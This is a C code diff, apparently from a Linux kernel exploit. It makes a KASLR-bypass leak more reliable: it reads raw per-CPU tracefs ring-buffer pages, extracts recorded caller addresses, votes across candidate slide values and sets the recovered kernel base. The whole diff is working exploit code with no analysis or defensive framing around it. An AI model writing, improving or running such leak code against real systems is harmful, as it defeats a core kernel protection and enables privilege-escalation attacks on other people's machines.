@@ -16,10 +16,34 @@ static int slide_tracefs_write(const char *path, const char *value) {
   return wrote == (ssize_t)len;
 }
 
-static int slide_tracefs_parse_page(
-    const unsigned char *page, size_t page_len, uintptr_t *candidate_out) {
+#define SLIDE_TRACEFS_CANDIDATE_SLOTS 32
+#ifndef SLIDE_TRACEFS_WORKER_CALLER_OFF2
+#define SLIDE_TRACEFS_WORKER_CALLER_OFF2 SLIDE_TRACEFS_WORKER_CALLER_OFF
+#endif
+#ifndef SLIDE_TRACEFS_WORKER_CALLER_OFF3
+#define SLIDE_TRACEFS_WORKER_CALLER_OFF3 SLIDE_TRACEFS_WORKER_CALLER_OFF
+#endif
+
+static void slide_tracefs_vote_caller(
+    uint64_t caller, uint64_t link_caller, unsigned *votes) {
+  if (caller >= link_caller) {
+    uint64_t cand = caller - link_caller;
+    if (cand <= 0x1f0000ULL && (cand & 0xffffULL) == 0) {
+      unsigned idx = (unsigned)(cand >> 16);
+      if (idx < SLIDE_TRACEFS_CANDIDATE_SLOTS) {
+        votes[idx]++;
+      }
+    }
+  }
+}
+#ifndef SLIDE_TRACEFS_MIN_VOTES
+#define SLIDE_TRACEFS_MIN_VOTES 3
+#endif
+
+static void slide_tracefs_count_page(
+    const unsigned char *page, size_t page_len, unsigned *votes) {
   if (page_len < 20) {
-    return 0;
+    return;
   }
 
   uint64_t commit = 0;
@@ -56,22 +80,19 @@ static int slide_tracefs_parse_page(
     if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
       uint64_t caller = 0;
       memcpy(&caller, page + record + 16, sizeof(caller));
-      uint64_t link_caller =
-          KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
-      if (caller >= link_caller) {
-        uint64_t candidate = caller - link_caller;
-        if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
-          pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
-                     (unsigned long long)caller,
-                     (unsigned long long)candidate);
-          *candidate_out = (uintptr_t)candidate;
-          return 1;
-        }
+      uint64_t link0 = KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
+      uint64_t link1 = KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF2;
+      uint64_t link2 = KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF3;
+      slide_tracefs_vote_caller(caller, link0, votes);
+      if (link1 != link0) {
+        slide_tracefs_vote_caller(caller, link1, votes);
+      }
+      if (link2 != link0 && link2 != link1) {
+        slide_tracefs_vote_caller(caller, link2, votes);
       }
     }
     pos = record + record_len;
   }
-  return 0;
 }
 
 static int slide_tracefs_trigger(void) {
@@ -154,31 +175,61 @@ static int slide_tracefs_leak_kernel_base(void) {
   slide_tracefs_write(tracing_on, "0");
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-  uintptr_t candidate = 0;
-  int found = 0;
-  for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
+  if (cpu_count <= 0 || cpu_count > 256) {
+    pr_error("slide tracefs bad cpu count=%d\n", cpu_count);
+    slide_tracefs_write(event_enable, "0");
+    return 0;
+  }
+  unsigned votes[SLIDE_TRACEFS_CANDIDATE_SLOTS] = {0};
+  int scan_errors = 0;
+  for (int cpu = 0; cpu < cpu_count; cpu++) {
     char path[128];
     snprintf(path, sizeof(path),
              SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
     int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
     if (fd < 0) {
+      scan_errors++;
       continue;
     }
     unsigned char page[4096];
     ssize_t got;
-    while ((got = read(fd, page, sizeof(page))) > 0) {
-      if (slide_tracefs_parse_page(page, (size_t)got, &candidate)) {
-        found = 1;
-        break;
+    while ((got = read(fd, page, sizeof(page))) != 0) {
+      if (got > 0) {
+        slide_tracefs_count_page(page, (size_t)got, votes);
+        continue;
       }
+      if (errno == EINTR) {
+        continue;
+      }
+      if (errno != EAGAIN) {
+        scan_errors++;
+      }
+      break;
     }
     close(fd);
   }
   slide_tracefs_write(event_enable, "0");
-  if (!found) {
-    pr_error("slide tracefs worker caller not found\n");
+  unsigned best = 0;
+  unsigned second = 0;
+  for (unsigned i = 1; i < SLIDE_TRACEFS_CANDIDATE_SLOTS; i++) {
+    if (votes[i] > votes[best]) {
+      second = votes[best];
+      best = i;
+    } else if (votes[i] > second) {
+      second = votes[i];
+    }
+  }
+  if (votes[best] < SLIDE_TRACEFS_MIN_VOTES) {
+    pr_error("slide tracefs worker caller not found best=%u votes=%u need=%d errors=%d\n",
+             best, votes[best], SLIDE_TRACEFS_MIN_VOTES, scan_errors);
     return 0;
   }
+  if (votes[best] == second) {
+    pr_error("slide tracefs vote tie best=%u votes=%u second=%u errors=%d\n",
+             best, votes[best], second, scan_errors);
+    return 0;
+  }
+  uintptr_t candidate = (uintptr_t)best << 16;
 
   slide_p0_offset = candidate;
   kaslr_base = KIMAGE_TEXT_BASE + candidate;
